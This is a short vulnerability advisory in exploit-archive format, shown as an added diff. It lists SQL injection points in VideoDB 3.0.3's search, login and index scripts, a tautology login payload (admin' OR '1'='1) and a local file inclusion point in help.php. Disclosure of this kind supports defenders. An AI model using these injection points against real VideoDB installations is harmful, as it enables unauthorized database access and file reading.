@@ -1,0 +1,57 @@
+# Exploit Title: VideoDB Multiple Vulnerabilities
+# Date: 09.10.2010
+# Author: Valentin
+# Category: webapps/0day
+# Version: 3.0.3 and earlier
+
+# Tested on: 
+# CVE :  
+# Code : 
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x1 ::::::::::::::::::::::::::::::::::::::]
+>> General Information 
+Advisory/Exploit Title = VideoDB Multiple Vulnerabilities
+Author = Valentin Hoebel
+Contact = valentin@xenuser.org
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x2 ::::::::::::::::::::::::::::::::::::::]
+>> Product information
+Name = VideoDB
+Vendor = Andreas Götz
+Vendor Website = http://www.videodb.net
+Affected Version(s) = 3.0.3 and earlier
+
+ 
+[:::::::::::::::::::::::::::::::::::::: 0x3 ::::::::::::::::::::::::::::::::::::::]
+>> 1 - SQL Injection / Possible Auth Bypass
+The VideoDB is affected by multiple SQL Injection vulnerabilities.
+
+a) The search script search.php
+search.php?q=test&engine=videodb&owner=Guest&fields[]=[SQL Injection]
+
+b) The login script login.php
+Trigger SQL errors with the user name field or try admin' OR '1'='1 as user name.
+Hint: "Normal" auth bypass is not possible.
+
+c) The index.php script
+index.php?filter=new&quicksearch=test&owner=%3Cany%3E&mediafilter=[SQL Injection]&submit.x=0&submit.y=0
+
+
+>> 2 - Local File Inclusion
+help.php?page=[LFI]
+Hint: Effective local file inclusion can be tricky.
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x4 ::::::::::::::::::::::::::::::::::::::]
+>> Additional Information
+Advisory/Exploit Published = 09.10.2010
+
+
+[:::::::::::::::::::::::::::::::::::::: 0x5 ::::::::::::::::::::::::::::::::::::::]
+>> Misc
+Greetz = cr4wl3r, JosS, packetstormsecurity.org, exploit-db.com
+
+
+[:::::::::::::::::::::::::::::::::::::: EOF ::::::::::::::::::::::::::::::::::::::]
